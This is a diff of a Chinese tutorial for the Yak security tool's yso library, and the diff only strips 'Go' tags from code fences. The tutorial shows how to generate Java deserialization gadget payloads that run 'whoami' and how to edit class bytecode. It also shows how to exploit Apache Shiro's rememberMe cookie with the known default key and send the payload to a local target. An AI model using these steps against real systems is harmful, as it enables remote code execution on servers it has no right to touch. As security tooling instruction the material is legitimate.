@@ -64,7 +64,7 @@ yso库提供了`yso.GetJavaObjectFromBytes`函数，其参数是`[]byte`类型�
 
 Java反序列化漏洞的形成源于攻击者精心构造的恶意序列化数据流，这些数据在反序列化时能够操纵或影响该过程。这种漏洞的典型利用路径是实现远程代码执行，攻击者经常会创建能够在反序列化阶段通过反射调用任意方法的类，常见的攻击方式包括使用 `Runtime.exec` 方法执行命令。为了通过反射调用`Runtime.exec`方法，常用的几个序列化数据流被总结为几条常用gadget，Yak可以直接构造出这些序列化数据。yso库提供了如`yso.GetCommonsBeanutils183NOCCJavaObject`、`yso.GetCommonsCollections1JavaObject`的生成类函数，可以根据需求选择gadget生成payload，其参数为可选参数，可以设置内部恶意类、命令等信息，返回值为*yso.JavaObject类型和一个error信息。
 
-```Go
+```
 gadgetObj = yso.GetCommonsBeanutils183NOCCJavaObject(yso.useRuntimeExecEvilClass("whoami"))~
 gadgetBytes = yso.ToBytes(gadgetObj)~
 ```
@@ -73,7 +73,7 @@ gadgetBytes = yso.ToBytes(gadgetObj)~
 
 yso库提供了yso.ToBytes函数，其参数为*yso.JavaObject类型，可以将序列化对象输出为字节流，除此之外还可以使用yso.ToJson输出为json。
 
-```Go
+```
 gadgetObj = yso.GetCommonsBeanutils183NOCCJavaObject(yso.useRuntimeExecEvilClass("whoami"))~
 gadgetBytes = yso.ToBytes(gadgetObj)~
 ```
@@ -113,7 +113,7 @@ gadgetBytes = yso.ToBytes(gadgetObj)~
 
 案例中的返回值classIns为ClassObject类型
 
-```Go
+```
 type ClassObject struct {
     Type                 string
     Magic                number
@@ -151,7 +151,7 @@ func (ClassObject) SetSourceFileName(name string) error
 
 通过对结构体属性的修改或通过结构体方法可以配置类结构的信息，再调用Byte方法可以重新生成字节数组，实现对class文件的修改，在上面的案例中，我们将/tmp/test.class文件解析为了结构化对象。下面的案例将会修改类名、java版本，并生成新class文件
 
-```Go
+```
 classIns.SetClassName("newTest")
 classIns.MajorVersion = 50
 file.Save("/tmp/newTest.class", classIns.Bytes())
@@ -161,7 +161,7 @@ file.Save("/tmp/newTest.class", classIns.Bytes())
 
 上面的案例中将修改后的class对象输出为bytes类型，除此外，还可以输出为bcel class，用于payload构造，或json格式字节码，可以用来查看class内部结构或对class信息修改。例如：
 
-```Go
+```
 buildPayload(classIns.Bcel()) // 构造payload
 dump(classIns.Json()) // 查看class内部结构
 ```
@@ -170,7 +170,7 @@ dump(classIns.Json()) // 查看class内部结构
 
 得益于java字节码修改的基础设施，可以在构造序列化payload时对class进行配置，如下是使用Yak脚本来生成CB1的payload，其中对class设置了版本为`52`、执行命令为`whoami`、class名为`djRiEemN`
 
-```Go
+```
 version = 52
 command = "whoami"
 className = "djRiEemN"
@@ -212,7 +212,7 @@ Apache Shiro在处理用户会话时使用了Java的序列化机制。用户的�
 
 先生成一个命令执行的payload：
 
-```Go
+```
 version = 52
 command = "whoami"
 className = "guAVnGeu"
@@ -228,7 +228,7 @@ gadgetBytes = yso.ToBytes(gadgetObj)~
 
 Shiro的Cookie默认使用默认key的cbc加密，所以需要再对payload加密，得到remberMe：
 
-```Go
+```
 base64Key = "kPH+bIxk5D2deZiIxcaaaA==" // base64编码的key
 key,_ = codec.DecodeBase64(base64Key) // 生成key
 payload = codec.PKCS5Padding(gadgetBytes, 16) // 加密payload
@@ -238,7 +238,7 @@ rememberMe = codec.EncodeBase64(append(key, encodePayload...))
 
 最后将payload发送至目标：
 
-```Go
+```
 target = "127.0.0.1:8080"
 rsp,req,_ = poc.HTTP(
   `GET /login HTTP/1.1
